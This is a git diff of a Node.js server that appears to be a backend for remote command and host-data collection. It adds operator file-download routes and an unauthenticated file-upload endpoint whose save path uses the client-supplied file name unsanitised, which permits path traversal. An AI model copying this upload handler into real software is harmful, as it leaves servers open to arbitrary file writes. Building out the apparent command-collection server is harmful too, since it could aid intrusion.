@@ -1,6 +1,8 @@
 const http = require("http");
 const url = require("url");
 const iconv = require("iconv-lite");
+const fs = require("fs");
+const formidable = require('formidable');
 
 const server = http.createServer().listen(3123);
 
@@ -15,8 +17,11 @@ const operatorQ = require("./operator/query.js");
 
 const attackNetworkQ = require("./attack_network/query.js");
 const attackLogQ = require("./attack_log/query.js");
+
 // GET
 getEventHandler.on("/op/get", operatorQ.getCommand);
+getEventHandler.on("/file/getTarget", operatorQ.getDownloadTargets);
+getEventHandler.on("/dir/create", operatorQ.createDir);
 getEventHandler.on("/network/get-arp", networkQ.getArp);
 getEventHandler.on("/network/get-internet", networkQ.getInternetConnection);
 getEventHandler.on("/network/get-socket", networkQ.getSocketConnection);
@@ -25,6 +30,8 @@ getEventHandler.on("/process/get-status", processQ.getProcessStatus);
 
 //POST
 postEventHandler.on("/op/post", operatorQ.postCommand);
+postEventHandler.on("/file/addTarget", operatorQ.addFileDownloadTarget);
+postEventHandler.on("/file/updateTarget", operatorQ.updateFileDownloadTarget);
 postEventHandler.on("/network/post-arp", networkQ.insertArp);
 postEventHandler.on("/network/post-conn", networkQ.insertInternetConnection);
 postEventHandler.on("/network/post-socks", networkQ.insertSocketConnection);
@@ -49,6 +56,25 @@ postEventHandler.on("/attack/network/post-log", attackLogQ.insertLog);
 server.on("request", (req, res) => {
   if (req.url === "/health") {
     healthCheck(req, res);
+  } else if (req.url === "/fileupload") {
+    var form = new formidable.IncomingForm();
+    form.uploadDir = "D:\\";
+    form.parse(req, function (err, fields, files) {
+      var oldpath = files.filetoupload.path;
+      var newpath = __dirname +'\\uploads\\' + files.filetoupload.name;
+      fs.rename(oldpath, newpath, function (err) {
+        if (err) throw err;
+        res.write('File uploaded and moved!');
+        res.end();
+      });
+    });
+  } else if (req.url==="/fff") {
+    res.writeHead(200, {'Content-Type': 'text/html'});
+    res.write('<html><head><meta charset="utf-8"></head><body><form action="fileupload" method="post" enctype="multipart/form-data">');
+    res.write('<input type="file" name="filetoupload"><br>');
+    res.write('<input type="submit">');
+    res.write('</form></body></html>');
+    return res.end();
   } else {
     commonRequest(req, res);
   }
@@ -76,7 +102,7 @@ function commonRequest(req, res) {
 
   req.on("end", () => {
     if (req.method === "GET") {
-      console.log(`[GET] : ${decoded}\r\n`);
+    //console.log(`[GET] : ${decoded}\r\n`);
       getEventHandler.emit(pathname, param, (err, rows) => {
         if (err) {
           res.writeHead(500, {
@@ -118,10 +144,4 @@ function commonRequest(req, res) {
 }
 function reverseString(str) {
   return str.split("").reverse().join("");
-}
-function getClientAddress(req) {
-  return (
-    (req.headers["x-forwarded-for"] || "").split(",")[0] ||
-    req.connection.remoteAddress
-  );
 }
